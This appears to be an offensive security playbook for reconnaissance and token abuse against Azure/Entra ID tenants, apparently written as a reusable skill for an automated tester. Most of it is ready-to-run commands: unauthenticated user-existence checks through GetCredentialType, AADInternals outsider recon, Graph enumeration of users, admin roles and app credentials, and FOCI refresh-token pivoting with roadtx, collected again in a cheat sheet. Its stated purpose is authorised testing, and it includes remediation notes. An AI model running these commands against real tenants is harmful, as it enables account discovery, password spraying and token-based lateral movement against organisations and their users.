# Azure Identity Reconnaissance — Skill Playbook

**Mitre ATT&CK ID:** T1087.004 (Account Discovery: Cloud Account), T1528 (Steal Application Access Token), T1110.003 (Brute Force: Password Spraying), T1550.001 (Use Alternate Authentication Material)
**OWASP Mapping:** A01:2021 – Broken Access Control, A07:2021 – Identification and Authentication Failures
**Severity:** High
**Last Updated:** 2026-08-02

---

## Metadata

```yaml
skill_id: azure-identity-recon-v2
category: cloud-security
cloud_provider: azure
author: HiveBreach
mitre_attack_id:
  - T1087.004
  - T1528
  - T1110.003
  - T1550.001
owasp_mapping:
  - A01:2021-Broken Access Control
  - A07:2021-Identification and Authentication Failures
tags:
  - azure
  - azure-ad
  - entra-id
  - reconnaissance
  - user-enumeration
  - roadtools
  - aadinternals
  - token-theft
tools:
  - roadrecon
  - roadtx
  - aadinternals
  - az-cli
  - curl
verification_required: sandbox
```

---

## 1. Detection

### 1.1 Passive Recon (unauthenticated)

```bash
# Tenant identification
dig +short <domain> MX TXT
curl -s "https://login.microsoftonline.com/<domain>/.well-known/openid-configuration" | jq -r '.issuer'
curl -s "https://login.microsoftonline.com/<domain>.onmicrosoft.com/.well-known/openid-configuration" | jq -r '.issuer'

# Azure AD vs consumer/MSA
curl -s "https://login.microsoftonline.com/getuserrealm.srf?login=user@<domain>&json=1" | jq -r '.NameSpaceType'
```

### 1.2 Enumerating Verified Domains and Federation

```bash
az login --allow-no-subscriptions
az rest --method GET --uri "https://graph.microsoft.com/v1.0/domains" \
  --query 'value[*].[id,isVerified,isDefault,authenticationType]' --output table
dig NS <domain>
```

### 1.3 Detect Federation / ADFS Exposure

```bash
curl -s "https://adfs.<domain>/adfs/services/trust/mex" | grep -o 'https://[^"]*' | head
curl -s "https://login.microsoftonline.com/<domain>/.well-known/openid-configuration" | \
  jq -r '.authorization_endpoint, .cloud_instance_name'
```

---

## 2. Confirmation

### 2.1 Confirm Tenant ID (cross-check sources)

```bash
# Source 1: openid-configuration issuer
curl -s "https://login.microsoftonline.com/<domain>/.well-known/openid-configuration" | jq -r '.issuer'
# Source 2: PowerShell tenant discovery
Import-Module AADInternals
Get-AADIntTenantID -Domain "<domain>"
```

### 2.2 Confirm User Existence (GetCredentialType)

```bash
curl -s -X POST "https://login.microsoftonline.com/common/GetCredentialType" \
  -H "Content-Type: application/json" \
  -d '{"Username":"user@<domain>","IsOtherIdpSupported":true}' | jq '{Exists:.IfExistsResult}'
```

---

## 3. Exploitation

### 3.1 Outsider Reconnaissance with AADInternals

```powershell
Import-Module AADInternals
Invoke-AADIntReconAsOutsider -DomainName "<domain>" | Format-List
Get-AADIntTenantBranding -DomainName "<domain>"
```

### 3.2 User Enumeration (authenticated)

```bash
az rest --method GET --uri "https://graph.microsoft.com/v1.0/users?\$select=userPrincipalName,displayName,accountEnabled,jobTitle,mail&$top=999" \
  --query 'value[*].[userPrincipalName,displayName,accountEnabled]' --output table
az ad user list -o table --query "[].{UPN:userPrincipalName,Enabled:accountEnabled,Job:jobTitle}"
```

### 3.3 Role and Group Enumeration

```bash
az rest --method GET --uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments?\$expand=principal" \
  --query 'value[*].{Role:roleDefinitionId,Principal:principal.userPrincipalName}' --output table
az rest --method GET --uri "https://graph.microsoft.com/v1.0/groups?\$select=displayName,mailEnabled,securityEnabled" \
  --query 'value[*].displayName' --output tsv
```

### 3.4 Service Principal and App Enumeration

```bash
az rest --method GET --uri "https://graph.microsoft.com/v1.0/servicePrincipals?\$select=displayName,appId,servicePrincipalType&$top=999" \
  --query 'value[*].displayName' --output tsv
az rest --method GET --uri "https://graph.microsoft.com/v1.0/applications?\$select=displayName,appId,passwordCredentials,keyCredentials" --output json
```

### 3.5 Device and Authentication Method Recon

```bash
az rest --method GET --uri "https://graph.microsoft.com/v1.0/devices?\$select=displayName,operatingSystem,isManaged&$top=999" --output json
az rest --method GET --uri "https://graph.microsoft.com/beta/me/authentication/methods" --output json
```

### 3.6 Token Exchange Recon (FOCI)

```bash
# Refresh token acquired for one resource; enumerate pivotable scopes
roadtx gettokens -u user@<domain> -p 'Pass' -c azcli -r msgraph
roadtx refreshtokento -r azrm --foci
roadtx describe -t <JWT> | jq '.aud, .appid, .scp'
roadtx getscope -s "https://graph.microsoft.com/Mail.Read https://graph.microsoft.com/User.Read.All" --foci
```

---

## 4. Tool-Guidance

### 4.1 ROADtools

```bash
pip install roadrecon roadtx
roadrecon auth --device-code
roadrecon gather
roadrecon gui
roadrecon plugin bloodhound
roadtx gettokens -u user@<domain> -p 'Pass' -c azcli -r msgraph
```

### 4.2 AADInternals

```powershell
Install-Module AADInternals -Scope CurrentUser
Import-Module AADInternals
Invoke-AADIntReconAsOutsider -DomainName "<domain>"
Get-AADIntTenantID -Domain "<domain>"
Get-AADIntAccessTokenForMSGraph -SaveToCache
Get-AADIntUsers | Select-Object UserPrincipalName, DirSyncEnabled
```

### 4.3 AzureHound

```bash
docker run -it --rm -e AZURE_TENANT_ID=<tenant> -e AZURE_CLIENT_ID=<client> \
  -e AZURE_CLIENT_SECRET=<secret> specterops/azurehound collect -o ./azurehound.json
jq '.data[] | select(.kind=="AzureUser") | .properties.userPrincipalName' azurehound.json
```

---

## 5. PoC Generation

### PoC Template

```markdown
## Azure Identity Recon — [FINDING_ID]

**Tenant:** <tenant-id> / <domain>
**Vector:** Unauthenticated user enum / over-privileged Graph read / token theft / FOCI pivot

### Proof
1. `GetCredentialType` returned IfExistsResult=0 for 42/50 user list
2. `Invoke-AADIntReconAsOutsider` identified federated + managed domains
3. `roadrecon gather` enumerated N users, M Global Admins, K groups
4. `roadtx refreshtokento` pivoted refresh token to ARM (FOCI)
5. [Screenshot]

### Impact
- Directory metadata exposure (T1087.004)
- Account pivot / lateral movement (T1550.001)

### Remediation
- Rate-limit/block GetCredentialType; enable logging of auth anomalies
- Enforce least privilege Graph scopes; audit delegated permissions
- Conditional Access on token acquisition; block legacy protocols
```

---

## 6. Verification

- [ ] Sandbox or authorised tenant only; no PII gathered beyond enumeration metadata
- [ ] Enumeration findings cross-checked with a second independent tool
- [ ] Tokens decrypted and scope/aud claims inspected before pivots
- [ ] Lockout thresholds respected during any spray activity
- [ ] Confirmed which findings are exploitable vs informational
- [ ] All captured data removed from attacker-controlled storage

---

## 7. CheatSheet

```bash
curl -s "https://login.microsoftonline.com/<domain>/.well-known/openid-configuration" | jq .issuer
curl -s -X POST "https://login.microsoftonline.com/common/GetCredentialType" -H "Content-Type: application/json" -d '{"Username":"u@<domain>"}'
az rest --method GET --uri "https://graph.microsoft.com/v1.0/users?\$select=userPrincipalName" -o tsv
az rest --method GET --uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments" --query 'value[].roleDefinitionId' -o tsv
roadrecon auth --device-code && roadrecon gather && roadrecon gui
roadtx gettokens -u u@<domain> -p 'Pass' -c azcli -r msgraph
roadtx refreshtokento -r azrm --foci
```

| Objective | Tool | Command |
|---|---|---|
| Tenant ID | curl | openid-configuration |
| User exists? | curl | GetCredentialType |
| Verified domains | az rest | /v1.0/domains |
| Full directory | roadrecon | gather + gui |
| Token pivot | roadtx | refreshtokento |
| Outsider recon | AADInternals | Invoke-AADIntReconAsOutsider |

---

## 8. Related Techniques (MITRE ATT&CK Mapping)

| Technique ID | Name | Relation |
|---|---|---|
| T1087.004 | Account Discovery: Cloud Account | User/role enumeration |
| T1528 | Steal Application Access Token | Token theft |
| T1110.003 | Brute Force: Password Spraying | Enables spray |
| T1550.001 | Use Alternate Authentication Material | PRT / token reuse |
| T1538 | Cloud Service Dashboard | Portal/tenant recon |
| T1078 | Valid Accounts | Post-valid-credential recon |

---

## 9. References

- ROADtools: https://github.com/dirkjanm/ROADtools
- AADInternals: https://github.com/Gerenios/AADInternals
- AzureHound: https://github.com/BloodHoundAD/AzureHound
- Microsoft Graph API: https://learn.microsoft.com/en-us/graph/api/
- TokenTactics: https://github.com/f-bader/TokenTactics
- MITRE T1087.004: https://attack.mitre.org/techniques/T1087/004/

---

*This playbook is for authorised security testing only. All verification must occur in sandbox environments.*
